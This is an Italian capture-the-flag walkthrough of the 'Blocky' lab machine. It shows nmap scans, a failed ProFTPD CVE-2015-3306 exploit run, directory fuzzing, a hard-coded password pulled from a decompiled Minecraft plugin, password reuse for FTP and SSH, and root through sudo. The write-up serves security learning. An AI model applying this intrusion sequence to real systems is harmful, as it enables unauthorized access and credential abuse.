---
title: "Blocky Walkthrough"
description: "Blocky è una macchina abbastanza semplice, basata su una reale. Dimostra i rischi legati a cattive pratiche nella gestione delle password e all’esposizione di file interni su sistemi accessibili pubblicamente. Inoltre, mette in evidenza un potenziale vettore d’attacco enorme: Minecraft. Esistono decine di migliaia di server pubblici, spesso gestiti da amministratori inesperti e giovani, diventando facile bersaglio."
author: dua2z3rr
date: 2025-09-09 1:00:00
categories: [Machines]
tags: ["Area di Interesse: Common Applications", "Area di Interesse: Software & OS exploitation", "Area di Interesse: Authentication", "Area di Interesse: Web Application", "Area di Interesse: Vulnerability Assessment", "Vulnerabilità: Misconfiguration", "Vulnerabilità:  Hard-coded Credentials", "Codice: Java"]
image: /assets/img/blocky/blocky-resized.png"
---

## Enumerazione Esterna

### Nmap

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $sudo nmap -vv -p- 10.10.10.37
<SNIP>
PORT      STATE  SERVICE   REASON
21/tcp    open   ftp       syn-ack ttl 63
22/tcp    open   ssh       syn-ack ttl 63
80/tcp    open   http      syn-ack ttl 63
8192/tcp  closed sophos    reset ttl 63
25565/tcp open   minecraft syn-ack ttl 63

<SNIP>

┌─[dua2z3rr@parrot]─[~]
└──╼ $sudo nmap -vv -p 21,22,80,8192,25565 -sC -sV 10.10.10.37
<SNIP>
PORT      STATE  SERVICE   REASON         VERSION
21/tcp    open   ftp       syn-ack ttl 63 ProFTPD 1.3.5a
22/tcp    open   ssh       syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDXqVh031OUgTdcXsDwffHKL6T9f1GfJ1/x/b/dywX42sDZ5m1Hz46bKmbnWa0YD3LSRkStJDtyNXptzmEp31Fs2DUndVKui3LCcyKXY6FSVWp9ZDBzlW3aY8qa+y339OS3gp3aq277zYDnnA62U7rIltYp91u5VPBKi3DITVaSgzA8mcpHRr30e3cEGaLCxty58U2/lyCnx3I0Lh5rEbipQ1G7Cr6NMgmGtW6LrlJRQiWA1OK2/tDZbLhwtkjB82pjI/0T2gpA/vlZJH0elbMXW40Et6bOs2oK/V2bVozpoRyoQuts8zcRmCViVs8B3p7T1Qh/Z+7Ki91vgicfy4fl
|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNgEpgEZGGbtm5suOAio9ut2hOQYLN39Uhni8i4E/Wdir1gHxDCLMoNPQXDOnEUO1QQVbioUUMgFRAXYLhilNF8=
|   256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILqVrP5vDD4MdQ2v3ozqDPxG1XXZOp5VPpVsFUROL6Vj
80/tcp    open   http      syn-ack ttl 63 Apache httpd 2.4.18
|_http-title: Did not follow redirect to http://blocky.htb
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
8192/tcp  closed sophos    reset ttl 63
25565/tcp open   minecraft syn-ack ttl 63 Minecraft 1.11.2 (Protocol: 127, Message: A Minecraft Server, Users: 0/20)
Service Info: Host: 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Analiziamo l'output di nmap. Abbiamo delle porte classiche come la 21 (ftp), la 22 (ssh) e la 80 (http). Abbiamo una porta chiusa con servizio sophos.

> Sophos Remote Management System (RMS) allows administrators to remotely manage, update, and monitor Sophos security products across an enterprise. It leverages a proprietary communication protocol to facilitate command delivery, status reporting, and policy update enforcement between endpoint agents and the management console..

Infine, sulla porta 25565 abbiamo... MINECRAFT?!

### HTTP

Accediamo alla porta 80.

![Desktop View](/assets/img/blocky/blocky-home-page.png)

Questa box si basa interamente su minecraft. Continuiamo a esplorare la homepage del sito in questione.

![Desktop View](/assets/img/blocky/blocky-home-page-2.png)

In fondo alla home page scopriamo che il sito è stato creato con wordpress e che ci potrebbe essere la presenza di un plugin per le statistiche dei giocatori. Possiamo inoltre accedere ad una pagina di **log in** su wordpress, ma non abbiamo le credenziali. Enumeriamo gli altri servizi aperti prima di prcedere con un brute-force o fuzzing.

L'unico post è stato scritto da uno user chiamato notch (ovviamente...). Questo potrebbe servirci in futuro.

### FTP

L'anonymous access non è abilitato, quindi non possiamo accedere al server ftp. ci serviranno delle credenziali.

### Ricerca Exploit

Cerchiamo se esistono exploit per questa versione di ftp.

![Desktop View](/assets/img/blocky/blocky-ftp-vuln-1.png)

Proviamo con questo.

```shell
┌─[✗]─[dua2z3rr@parrot]─[~/Boxes/blocky/exploit-CVE-2015-3306]
└──╼ $python3 exploit.py --host 10.10.10.37 --port 21 --path "/var/www/wordpress/"
[+] CVE-2015-3306 exploit by t0kx
[+] Exploiting 10.10.10.37:21
[!] Failed
```

L'exploit fallisce. Continuiamo la nostra enumerazione

### Fuzzing

Dopo aver utilizzato il comando `ffuf -w /home/dua2z3rr/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt:FUZZ -u http://blocky.htb/FUZZ -ic -fw 20 -recursion` veniamo a conoscenza della directory `plugins` dove possiamo scaricare 2 file jar.

![Desktop View](/assets/img/blocky/blocky-plugins-dir.png)

Scarichiamoli.

## Reverse Engineering

### BlockyCore.class

Nel primo JAR troviamo il source code del primo plugin.

![Desktop View](/assets/img/blocky/blocky-plugin-source.png)

Utilizziamo un sito per leggere il bytecode.

![Desktop View](/assets/img/blocky/blocky-class.png)

Troviamo la stringa `8YsqfCTnvxAUeduzjNSXe22` per accedere a un database. Proviamola come password nel server ftp con user notch.

### FTP

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $ftp 10.10.10.37
Connected to 10.10.10.37.
220 ProFTPD 1.3.5a Server (Debian) [::ffff:10.10.10.37]
Name (10.10.10.37:dua2z3rr): notch
331 Password required for notch
Password: 
230 User notch logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

Prendiamo la user flag.

## Shell come notch

Colleghiamoci come notch con ssh con le credenziali utilizzate per ftp e utilizziamo il comando `sudo -l`.

```shell
notch@Blocky:~$ sudo -l
Matching Defaults entries for notch on Blocky:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User notch may run the following commands on Blocky:
    (ALL : ALL) ALL
```

Non dobbiamo fare alcuna privilege escalation. Possiamo diventare root semplicemente utilizzando `sudo -i`.

```shell
notch@Blocky:~$ sudo -i
root@Blocky:~#
```

Prendiamo la root flag e terminiamo la box.
